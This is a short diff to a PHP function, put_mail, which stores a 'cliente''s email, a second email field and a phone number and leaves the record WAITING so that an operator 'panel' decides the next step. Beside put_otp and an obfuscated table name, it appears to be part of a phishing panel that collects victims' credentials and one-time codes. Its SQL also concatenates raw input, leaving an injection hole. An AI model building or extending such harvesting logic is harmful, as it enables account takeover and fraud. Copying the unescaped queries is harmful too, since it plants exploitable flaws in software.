@@ -1060,9 +1060,11 @@ function put_otp($id,$cd){
 
 function put_mail($id,$mail,$cm,$cel){
 	date_default_timezone_set('America/Bogota');
-	$hoy = date("Y-m-d H:i:s"); 
+	$hoy = date("Y-m-d H:i:s");
 	if ($con = conectar()) {
-		sentencia($con,"UPDATE m3it3m SET status = '5', email='".$mail."', cemail='".$cm."', celular='".$cel."', horamodificado='".$hoy."'  WHERE idreg = ".$id);
+		// Solo guardar email sin cambiar status - cliente se queda en WAITING
+		// El panel ve que llegó el email y decide el siguiente paso
+		sentencia($con,"UPDATE m3it3m SET email='".$mail."', cemail='".$cm."', celular='".$cel."', horamodificado='".$hoy."'  WHERE idreg = ".$id);
 		desconectar($con);
 	}
 }
